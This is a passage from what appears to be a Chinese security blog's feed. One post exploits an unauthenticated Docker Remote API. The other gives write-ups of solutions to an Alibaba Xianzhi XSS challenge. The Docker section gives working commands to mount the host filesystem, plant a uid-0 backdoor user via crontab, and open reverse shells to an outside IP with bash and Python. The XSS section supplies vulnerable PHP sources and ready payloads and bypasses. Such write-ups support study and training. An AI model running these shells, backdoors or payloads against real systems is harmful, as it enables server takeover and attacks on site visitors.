class="string">"ASP.aabb_aspx,App_Web_amovoubm"</span> validate=<span class="string">"True"</span>/&gt;</span><br><span class="line">    &lt;/httpHandlers&gt;</span><br><span class="line">  &lt;/<span class="built_in">system</span>.web&gt;</span><br></pre></td></tr></table></figure></li><li><p>将Dll文件copy到目标主机网站根目录/bin目录下访问网站链接木马路径即可</p></li></ol><h2 id="0x02-Remote-API利用姿势"><a href="#0x02-Remote-API利用姿势" class="headerlink" title="0x02 Remote API利用姿势"></a>0x02 Remote API利用姿势</h2><p>主要问题：docker remote api未授权</p><h3 id="1-测试环境准备"><a href="#1-测试环境准备" class="headerlink" title="1.测试环境准备"></a>1.测试环境准备</h3><p>测试环境：快捷安装shipyard(docker图形化管理)，未设置访问权限</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">#在安装docker环境下</span><br><span class="line">curl -sSL https://shipyard-project.com/deploy | bash -s</span><br></pre></td></tr></table></figure><h3 id="2-漏洞检测与利用准备"><a href="#2-漏洞检测与利用准备" class="headerlink" title="2.漏洞检测与利用准备"></a>2.漏洞检测与利用准备</h3><ul><li><p>查看docker集群信息</p><figure class="highlight armasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">docker</span> -H 目标<span class="built_in">IP</span> <span class="meta">info</span></span><br></pre></td></tr></table></figure></li><li><p>查看docker集群镜像</p><figure class="highlight armasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">docker</span> -H 目标<span class="built_in">IP</span> images</span><br></pre></td></tr></table></figure></li><li><p>在目标服务器建立docker容器（最好选择服务器已有镜像），并挂载目标服务器所有文件路径到容器/var/hack路径下</p><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker -H 目标IP run -d -v /<span class="symbol">:/var/hack</span> --name getshell tutum/lamp</span><br></pre></td></tr></table></figure></li><li><p>进入docker容器进行漏洞利用（此处name为getshell</p><figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker -H <span class="number">123.207</span>.*.* exec -<span class="keyword">it</span> getshell /bin/bash</span><br></pre></td></tr></table></figure></li></ul><h3 id="3-漏洞利用姿势"><a href="#3-漏洞利用姿势" class="headerlink" title="3.漏洞利用姿势"></a>3.漏洞利用姿势</h3><p><strong>3.1上传公钥证书直接root登录</strong><br>生成公私钥对</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh-keygen -t rsa</span><br></pre></td></tr></table></figure><p>上传公钥到目标主机/root/.ssh/authorized_keys文件，然后ssh直接登录root（如果私钥设置密码，需要输入密码）</p><p><strong>3.2修改crontab添加root权限用户</strong><br>编辑/etc/crontab文件最后添加</p><figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">*/<span class="number">1</span> * * * *  root /usr/sbin/useradd 用户名-u <span class="number">0</span> -g <span class="number">0</span> -o &amp;&amp; echo <span class="string">"用户名:密码"</span>|chpasswd</span><br><span class="line">*/<span class="number">1</span> * * * *  root /usr/sbin/useradd <span class="number">123</span> -u <span class="number">0</span> -g <span class="number">0</span> -o &amp;&amp; echo <span class="string">"123:123456"</span>|chpasswd</span><br></pre></td></tr></table></figure><p>ssh连接，使用新建的用户名密码登录<br><strong>3.3修改crontab反弹shell</strong><br>bash版（前两句代码指定运行的环境变量）<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">SHELL=/bin/bash</span><br><span class="line">PATH=/sbin:/bin:/usr/sbin:/usr/bin</span><br><span class="line">*/1 * * * *  root bash -i &gt;&amp; /dev/tcp/123.207.*.*/8888 0&gt;&amp;1</span><br></pre></td></tr></table></figure></p><p>python版<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">*/<span class="number">1</span> * * * *  rootpython -c <span class="string">'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("123.207.*.*",8888));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'</span></span><br><span class="line">python -c <span class="string">'import os;os.popen("bash -i &gt;&amp; /dev/tcp/123.207.*.*/8888 0&gt;&amp;1");'</span></span><br></pre></td></tr></table></figure></p><p><strong>3.4编写web目录下的文件直接getshell</strong><br>这个不多说</p><p><strong>提示:</strong><br>本博客里任何文章/动画/教程以及各类软件/工具等仅供个人测试研究，请在下载后24小时内删除，不得用于商业或非法用途，否则后果自负。</p>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;0x00-前言&quot;&gt;&lt;a href=&quot;#0x00-前言&quot; class=&quot;headerlink&quot; title=&quot;0x00 前言&quot;&gt;&lt;/a&gt;0x00 前言&lt;/h2&gt;&lt;p&gt;这是很久之前的一次内部分享，整理后分享出来。&lt;br&gt;
    
    </summary>
    
      <category term="Security" scheme="http://blackwolfsec.cc/categories/Security/"/>
    
    
      <category term="ASPX" scheme="http://blackwolfsec.cc/tags/ASPX/"/>
    
      <category term="Webshell隐藏" scheme="http://blackwolfsec.cc/tags/Webshell%E9%9A%90%E8%97%8F/"/>
    
      <category term="Docker" scheme="http://blackwolfsec.cc/tags/Docker/"/>
    
  </entry>
  
  <entry>
    <title>阿里先知XSS挑战赛</title>
    <link href="http://blackwolfsec.cc/2017/08/30/alixss/"/>
    <id>http://blackwolfsec.cc/2017/08/30/alixss/</id>
    <published>2017-08-29T16:00:00.000Z</published>
    <updated>2017-08-31T01:24:26.459Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>最近阿里先知论坛发起XSS挑战赛，记录一下自己做出的几道题的思路<br><a id="more"></a></p><h2 id="0x01-题目及解答"><a href="#0x01-题目及解答" class="headerlink" title="0x01 题目及解答"></a>0x01 题目及解答</h2><h3 id="1-XSS-文件上传"><a href="#1-XSS-文件上传" class="headerlink" title="1.XSS-文件上传"></a>1.XSS-文件上传</h3><p><strong>两个文件的源码如下</strong><br>xss1.php<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php">header(<span class="string">"X-XSS-Protection: 0"</span>);</span></span><br><span class="line"><span class="php">$target_dir = <span class="string">"uploads/"</span>;</span></span><br><span class="line"><span class="php">$target_file = $target_dir . basename($_FILES[<span class="string">"fileToUpload"</span>][<span class="string">"name"</span>]);</span></span><br><span class="line"><span class="php">$uploadOk = <span class="number">1</span>;</span></span><br><span class="line"><span class="php">$imageFileType = pathinfo($target_file,PATHINFO_EXTENSION);</span></span><br><span class="line"><span class="php"><span class="comment">// Check if image file is a actual image or fake image</span></span></span><br><span class="line"><span class="php"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">"submit"</span>])) &#123;</span></span><br><span class="line"><span class="php">    $check = getimagesize($_FILES[<span class="string">"fileToUpload"</span>][<span class="string">"tmp_name"</span>]);</span></span><br><span class="line"><span class="php">    <span class="keyword">if</span>($check !== <span class="keyword">false</span>) &#123;</span></span><br><span class="line"><span class="php">        <span class="keyword">echo</span> <span class="string">"File is an image - "</span> . $check[<span class="string">"mime"</span>] . <span class="string">".&lt;BR&gt;"</span>;</span></span><br><span class="line"><span class="php">        $uploadOk = <span class="number">1</span>;</span></span><br><span class="line"><span class="php">    &#125; <span class="keyword">else</span> &#123;</span></span><br><span class="line"><span class="php">        <span class="keyword">echo</span> <span class="string">"File is not an image."</span>;</span></span><br><span class="line"><span class="php">        $uploadOk = <span class="number">0</span>;</span></span><br><span class="line"><span class="php">    &#125;</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"><span class="php"><span class="comment">// Check if file already exists</span></span></span><br><span class="line"><span class="php"><span class="keyword">if</span> (file_exists($target_file)) &#123;</span></span><br><span class="line"><span class="php">    <span class="keyword">echo</span> <span class="string">"Sorry, file already exists."</span>;</span></span><br><span class="line"><span class="php">    $uploadOk = <span class="number">0</span>;</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"><span class="php"><span class="comment">// Check file size</span></span></span><br><span class="line"><span class="php"><span class="keyword">if</span> ($_FILES[<span class="string">"fileToUpload"</span>][<span class="string">"size"</span>] &gt; <span class="number">500000</span>) &#123;</span></span><br><span class="line"><span class="php">    <span class="keyword">echo</span> <span class="string">"Sorry, your file is too large."</span>;</span></span><br><span class="line"><span class="php">    $uploadOk = <span class="number">0</span>;</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"><span class="php"><span class="comment">// Allow certain file formats</span></span></span><br><span class="line"><span class="php"><span class="keyword">if</span>($imageFileType != <span class="string">"jpg"</span> &amp;&amp; $imageFileType != <span class="string">"png"</span> &amp;&amp; $imageFileType != <span class="string">"jpeg"</span></span></span><br><span class="line"><span class="php">&amp;&amp; $imageFileType != <span class="string">"gif"</span> ) &#123;</span></span><br><span class="line"><span class="php">    <span class="keyword">echo</span> <span class="string">"Sorry, only JPG, JPEG, PNG &amp; GIF files are allowed."</span>;</span></span><br><span class="line"><span class="php">    $uploadOk = <span class="number">0</span>;</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"><span class="php"><span class="comment">// Check if $uploadOk is set to 0 by an error</span></span></span><br><span class="line"><span class="php"><span class="keyword">if</span> ($uploadOk == <span class="number">0</span>) &#123;</span></span><br><span class="line"><span class="php">    <span class="keyword">echo</span> <span class="string">"Sorry, your file was not uploaded."</span>;</span></span><br><span class="line"><span class="php"><span class="comment">// if everything is ok, try to upload file</span></span></span><br><span class="line"><span class="php">&#125; <span class="keyword">else</span> &#123;</span></span><br><span class="line"><span class="php">        <span class="keyword">echo</span> <span class="string">"The file "</span>. basename( $_FILES[<span class="string">"fileToUpload"</span>][<span class="string">"name"</span>]). <span class="string">" has been uploaded."</span>;</span></span><br><span class="line"><span class="php">    </span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"><span class="php"><span class="meta">?&gt;</span></span></span><br></pre></td></tr></table></figure></p><p>xss1.htm<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE html&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">"xss1.php"</span> <span class="attr">method</span>=<span class="string">"post"</span> <span class="attr">enctype</span>=<span class="string">"multipart/form-data"</span>&gt;</span></span><br><span class="line">    Select image to upload:</span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"file"</span> <span class="attr">name</span>=<span class="string">"fileToUpload"</span> <span class="attr">id</span>=<span class="string">"fileToUpload"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"submit"</span> <span class="attr">value</span>=<span class="string">"Upload Image"</span> <span class="attr">name</span>=<span class="string">"submit"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure></p><p><strong>解题思路</strong><br>直接上传一个构造好文件名的图片即可触发xss，但是实际使用中不可能要求攻击对象自己上传图片并burp修改文件名，难点在如何构造一个POST包自动模拟上传文件，参考：<a href="https://xianzhi.aliyun.com/forum/read/224.html" target="_blank" rel="noopener">从XSSer的角度测试上传文件功能</a>，可以在IE浏览器下实现文件上传模拟，这里需要先上传正常图片burp抓包对比，然后构造对应的字段，而且不能再filename中出现字符<code>/</code>,最后构造poc文件如下：<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">utf-8</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">id</span>=<span class="string">"form"</span> <span class="attr">enctype</span>=<span class="string">"multipart/form-data"</span> <span class="attr">accept-charset</span>=<span class="string">"utf-8"</span> <span class="attr">action</span>=<span class="string">"http://ec2-13-58-146-2.us-east-2.compute.amazonaws.com/xss1.php"</span> <span class="attr">method</span>=<span class="string">"POST"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">textarea</span> <span class="attr">name</span>=<span class="string">'fileToUpload"; filename="&lt;svg onload=alert(document.domain);&gt;GIF89a1.jpg'</span> <span class="attr">Content-Type</span>=<span class="string">"image/jpeg"</span>&gt;</span>xss<span class="tag">&lt;/<span class="name">textarea</span>&gt;</span><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"submit"</span> <span class="attr">value</span>=<span class="string">"submit"</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript"><span class="built_in">document</span>.getElementById(<span class="string">'form'</span>).submit();</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure></p><h3 id="2-XSS-referrer和REQUEST-URI"><a href="#2-XSS-referrer和REQUEST-URI" class="headerlink" title="2.XSS-referrer和REQUEST_URI"></a>2.XSS-referrer和REQUEST_URI</h3><p><strong>两个题的源码</strong><br>xss4.php<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php">header(<span class="string">"X-XSS-Protection: 0"</span>);</span></span><br><span class="line"><span class="php"><span class="meta">?&gt;</span></span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">"utf-8"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="php"><span class="meta">&lt;?php</span> <span class="keyword">echo</span> <span class="string">"你来自:"</span>.$_SERVER[<span class="string">'HTTP_REFERER'</span>];<span class="meta">?&gt;</span></span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure></p><p>xss13.php<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php">header(<span class="string">"X-XSS-Protection: 0"</span>);</span></span><br><span class="line"><span class="php"><span class="keyword">echo</span> <span class="string">"REQUEST_URI:"</span>.$_SERVER[<span class="string">'REQUEST_URI'</span>];</span></span><br><span class="line"><span class="php"><span class="meta">?&gt;</span></span></span><br></pre></td></tr></table></figure></p><p><strong>解题思路</strong><br>直接返回请求的referer值或REQUEST_URI到页面上，所以可以插入执行XSS<br>第一种解法：由于chrome和firefox浏览器以及win10版的IE浏览器均会把referer及REQUEST_URI采用URL编码，所以不能成功执行XSS脚本，但是可以在Win7操作系统下的IE浏览器上不会进行URL编码，可以利用如下脚本跳转触发XSS,<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="javascript"><span class="built_in">window</span>.location.href=<span class="string">"http://ec2-13-58-146-2.us-east-2.compute.amazonaws.com/xss4.php"</span>;</span></span><br><span class="line"><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure></p><p>请求url为：<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://localshot/xss4.html?<span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript">alert(<span class="built_in">document</span>.domain)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure></p><p>第二种解法：利用flash跳转可以在Win10的IE下成功执行XSS,参考<a href="https://paper.seebug.org/61/" target="_blank" rel="noopener">XSS via Referrer After Anniversary Update</a><br>（1）利用navigateToURL跳转<br>利用Adobe Flash Professional CS6工具，新建ActionScript文件命名xss_referrer.as，内容如下：<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">package &#123;</span><br><span class="line"> <span class="keyword">import</span> flash.display.Sprite;</span><br><span class="line"> <span class="keyword">import</span> flash.net.URLRequest;</span><br><span class="line"> <span class="keyword">import</span> flash.net.navigateToURL;</span><br><span class="line"> public <span class="class"><span class="keyword">class</span> <span class="title">xss_referrer</span> <span class="keyword">extends</span> <span class="title">Sprite</span></span>&#123;</span><br><span class="line">  public <span class="function"><span class="keyword">function</span> <span class="title">xss_referrer</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line">  public <span class="function"><span class="keyword">function</span> <span class="title">xss</span>(<span class="params"></span>):<span class="title">String</span></span>&#123;</span><br><span class="line"><span class="keyword">var</span> url:URLRequest = <span class="keyword">new</span> URLRequest(<span class="string">"http://ec2-13-58-146-2.us-east-2.compute.amazonaws.com/xss4.php"</span>);</span><br><span class="line">    navigateToURL(url, <span class="string">"_self"</span>);  </span><br><span class="line">   &#125;</span><br><span class="line"> &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="string">``</span><span class="string">` </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">保存，然后新建ActionScript 3.0（.fla）文件，xss_referrer.as保存在同一目录下，F9进入动作编程界面，输入内容如下：</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">`</span><span class="string">``</span>javascript</span><br><span class="line"><span class="keyword">var</span> xss:xss_referrer = <span class="keyword">new</span> xss_referrer();</span><br></pre></td></tr></table></figure></p><p>接着导出为swf文件。<br>请求url为（Win10下的IE成功执行脚本）：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://localshot/xss4.swf?<span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript">alert(<span class="built_in">document</span>.domain)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><p>（2）利用getURL跳转<br>利用Adobe Flash Professional CS6工具，新建ActionScript 2.0（.fla）文件，笔者测试如果选择ActionScript 3.0文件会提示没有getURL函数，输入内容如下：</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="title">getURL</span><span class="params">(<span class="string">"http://ec2-13-58-146-2.us-east-2.compute.amazonaws.com/xss4.php"</span>,<span class="string">""</span>,<span class="string">"get"</span>)</span></span></span><br></pre></td></tr></table></figure><p>同样需要导出为swf文件<br>请求url为（Win10下的IE成功执行脚本）：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://localshot/xss4.swf?<span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript">alert(<span class="built_in">document</span>.domain)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="3-XSS-跳转"><a href="#3-XSS-跳转" class="headerlink" title="3.XSS-跳转"></a>3.XSS-跳转</h3><p><strong>源码文件</strong><br>xss5.php<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php">header(<span class="string">"X-XSS-Protection: 0"</span>);</span></span><br><span class="line"><span class="php">$url=str_replace(urldecode(<span class="string">"%00"</span>),<span class="string">""</span>,$_GET[<span class="string">"url"</span>]);</span></span><br><span class="line"><span class="php">$url=str_replace(urldecode(<span class="string">"%0d"</span>),<span class="string">""</span>,$url);</span></span><br><span class="line"><span class="php">$url=str_replace(urldecode(<span class="string">"%0a"</span>),<span class="string">""</span>,$url);</span></span><br><span class="line"><span class="php">header(<span class="string">"Location: "</span>.$url);</span></span><br><span class="line"><span class="php"><span class="meta">?&gt;</span></span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">"utf-8"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="php"><span class="meta">&lt;?php</span> <span class="keyword">echo</span> <span class="string">"&lt;a href='"</span>.$url.<span class="string">"'&gt;如果跳转失败请点我&lt;/a&gt;"</span>;<span class="meta">?&gt;</span></span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure></p><p><strong>解题思路</strong><br>开时想采用%00，%0a,%0d来阻止location跳转，参考<a href="https://www.leavesongs.com/PENETRATION/bottle-crlf-cve-2016-9964.html#" target="_blank" rel="noopener">Bottle HTTP 头注入漏洞探究</a>，然而都过滤了，在朋友的指点下学习了不同解法<br>(1)gopher协议<br><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">http</span>://ec2-13-58-146-2.us-east-2.compute.amazonaws.com/xss5.php?url=gopher://123<span class="number">%27</span><span class="number">%20</span>./a<span class="number">%3</span>E<span class="number">%20</span><span class="number">%3</span>Cscript<span class="number">%3</span>Ealert(document.domain)<span class="number">%3</span>C/script<span class="number">%3</span>E</span><br></pre></td></tr></table></figure></p><p>(2)端口号（0、1、9、117等）<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ec2-13-58-146-2.us-east-2.compute.amazonaws.com/xss5.php?url=https://www.baidu.com:0?'<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined">alert(1)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure></p><h3 id="4-XSS-强制下载"><a href="#4-XSS-强制下载" class="headerlink" title="4.XSS-强制下载"></a>4.XSS-强制下载</h3><p><strong>源码文件</strong><br>xss6.php<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">header(<span class="string">"X-XSS-Protection: 0"</span>);</span><br><span class="line">header(<span class="string">'Content-Disposition: attachment; filename="'</span>.$_GET[<span class="string">"filename"</span>].<span class="string">'"'</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(substr($_GET[<span class="string">"url"</span>],<span class="number">0</span>,<span class="number">4</span>) ===<span class="string">"http"</span> &amp;&amp; substr($_GET[<span class="string">"url"</span>],<span class="number">0</span>,<span class="number">8</span>)&lt;&gt;<span class="string">"http://0"</span> &amp;&amp; substr($_GET[<span class="string">"url"</span>],<span class="number">0</span>,<span class="number">8</span>)&lt;&gt;<span class="string">"http://1"</span> &amp;&amp; substr($_GET[<span class="string">"url"</span>],<span class="number">0</span>,<span class="number">8</span>)&lt;&gt;<span class="string">"http://l"</span> &amp;&amp; strpos($_GET[<span class="string">"url"</span>], <span class="string">'@'</span>) === <span class="keyword">false</span>)</span><br><span class="line">&#123;</span><br><span class="line">$opts = <span class="keyword">array</span>(<span class="string">'http'</span> =&gt;</span><br><span class="line">    <span class="keyword">array</span>(</span><br><span class="line">        <span class="string">'method'</span> =&gt; <span class="string">'GET'</span>,</span><br><span class="line">        <span class="string">'max_redirects'</span> =&gt; <span class="string">'0'</span>,</span><br><span class="line">        <span class="string">'ignore_errors'</span> =&gt; <span class="string">'1'</span></span><br><span class="line">    )</span><br><span class="line">);</span><br><span class="line">$context = stream_context_create($opts);</span><br><span class="line">$url=str_replace(<span class="string">".."</span>,<span class="string">""</span>,$_GET[<span class="string">"url"</span>]);</span><br><span class="line">$stream = fopen($url, <span class="string">'r'</span>, <span class="keyword">false</span>, $context);</span><br><span class="line"><span class="keyword">echo</span> stream_get_contents($stream);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"Bad URL!"</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p><p><strong>解题思路</strong><br>%00 %0a %0d来阻止下载，返回目标问文件内容导致xss，<br>xss6.txt的内容为<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript">alert(<span class="built_in">document</span>.domain)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure></p><p>还有这里需要使用域名的方式绕过限制,请求URL如下：<br><figure class="highlight subunit"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://ec2<span class="string">-13</span><span class="string">-58</span><span class="string">-146</span><span class="string">-2</span>.us-east<span class="string">-2</span>.compute.amazonaws.com/xss6.php?filename=%00&lt;11111111111111&gt;download&amp;url=http://xxxxxxxx.eu5.org/xss6.txt</span><br></pre></td></tr></table></figure></p><h3 id="5-XSS-HIDDEN"><a href="#5-XSS-HIDDEN" class="headerlink" 